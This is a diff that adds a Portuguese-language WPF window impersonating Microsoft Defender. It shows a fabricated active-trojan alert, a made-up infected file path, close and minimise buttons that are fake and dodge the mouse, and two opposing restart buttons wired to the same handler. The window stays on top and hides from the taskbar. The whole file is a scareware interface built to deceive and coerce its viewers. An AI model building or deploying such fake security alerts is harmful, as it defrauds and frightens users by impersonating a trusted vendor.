@@ -1,0 +1,62 @@
+﻿<Window x:Class="WinDefenderSmartScreen.MainWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Title="Microsoft Defender Preview" Height="500" Width="650" 
+        WindowStyle="None" AllowsTransparency="True" x:Name="JanelaPrincipal"
+        Background="{Binding ElementName=JanelaPrincipal, Path=CorFundo}" 
+        BorderBrush="{Binding ElementName=JanelaPrincipal, Path=CorBorda}" 
+        BorderThickness="1" WindowStartupLocation="CenterScreen" 
+        Topmost="True" 
+        ShowInTaskbar="False" 
+        ResizeMode="NoResize">
+
+    <Grid>
+        <Grid.RowDefinitions>
+            <RowDefinition Height="32"/>
+            <RowDefinition Height="*"/>
+        </Grid.RowDefinitions>
+
+        <Grid Grid.Row="0" Background="#F3F3F3">
+            <StackPanel Orientation="Horizontal" VerticalAlignment="Center" Margin="10,0">
+                <Image Source="defender.png" Width="16" Height="16" Margin="0,0,10,0" RenderOptions.BitmapScalingMode="HighQuality"/>
+                <TextBlock Text="Microsoft Defender Preview" FontSize="12" Foreground="#555555" VerticalAlignment="Center"/>
+            </StackPanel>
+
+            <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
+                <Button Content="?" Width="46" Background="Transparent" BorderThickness="0" Foreground="#555555" MouseEnter="FugirMouse_MouseEnter" Click="BtnFecharFalso_Click"/>
+                <Button Content="─" Width="46" Background="Transparent" BorderThickness="0" Foreground="#555555" MouseEnter="FugirMouse_MouseEnter" Click="BtnFecharFalso_Click"/>
+                <Button Content="✕" Width="46" Background="Transparent" BorderThickness="0" Foreground="#555555" MouseEnter="FugirMouse_MouseEnter" Click="BtnFecharFalso_Click"/>
+            </StackPanel>
+        </Grid>
+
+        <Grid Grid.Row="1" Margin="40,30,40,40">
+            <Grid.RowDefinitions>
+                <RowDefinition Height="Auto"/>
+                <RowDefinition Height="*"/>
+                <RowDefinition Height="Auto"/>
+            </Grid.RowDefinitions>
+
+            <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,30">
+                <Image Source="logoDefender.png" Width="50" Height="50" Stretch="Uniform" RenderOptions.BitmapScalingMode="HighQuality"/>
+                <StackPanel Margin="20,0,0,0" VerticalAlignment="Center">
+                    <TextBlock Text="Ameaça encontrada - ação necessária." Foreground="{Binding ElementName=JanelaPrincipal, Path=CorTextoPrincipal}" FontSize="20" FontWeight="SemiBold"/>
+                    <TextBlock x:Name="TxtDataHora" Foreground="{Binding ElementName=JanelaPrincipal, Path=CorTextoSecundario}" FontSize="13" />
+                </StackPanel>
+            </StackPanel>
+
+            <StackPanel Grid.Row="1">
+                <TextBlock Text="Detectado: TrojanDownloader:BAT/Powdow!MSR" Foreground="{Binding ElementName=JanelaPrincipal, Path=CorTextoPrincipal}" FontSize="15" Margin="0,0,0,10"/>
+                <TextBlock Text="Status: Ativo" Foreground="{Binding ElementName=JanelaPrincipal, Path=CorTextoPrincipal}" FontSize="15" Margin="0,0,0,10"/>
+                <TextBlock Text="As ameaças ativas estão a ser executadas no seu dispositivo." Foreground="{Binding ElementName=JanelaPrincipal, Path=CorTextoPrincipal}" TextWrapping="Wrap" FontSize="15" Margin="0,0,0,20"/>
+                <TextBlock x:Name="TxtDataDetalhe" Foreground="{Binding ElementName=JanelaPrincipal, Path=CorTextoPrincipal}" FontSize="15" Margin="0,0,0,20"/>
+                <TextBlock Text="Itens afetados:" Foreground="{Binding ElementName=JanelaPrincipal, Path=CorTextoPrincipal}" FontSize="16" FontWeight="Bold" Margin="0,0,0,5"/>
+                <TextBlock Text="arquivo: C:\Users\Public\Downloads\PerfLogs\sys_fixer.bat" Foreground="{Binding ElementName=JanelaPrincipal, Path=CorTextoSecundario}" FontSize="13" TextWrapping="Wrap" Margin="10,0,0,0"/>
+            </StackPanel>
+
+            <StackPanel Grid.Row="2" Orientation="Horizontal" HorizontalAlignment="Right">
+                <Button Content="Não reiniciar agora" Click="BtnReiniciar_Click" Background="#FF0000" Foreground="White" Width="180" Height="40" Margin="0,0,15,0" FontWeight="SemiBold"/>
+                <Button Content="Sim, reiniciar agora" Click="BtnReiniciar_Click" Background="#0078D4" Foreground="White" Width="180" Height="40" FontWeight="SemiBold"/>
+            </StackPanel>
+        </Grid>
+    </Grid>
+</Window>
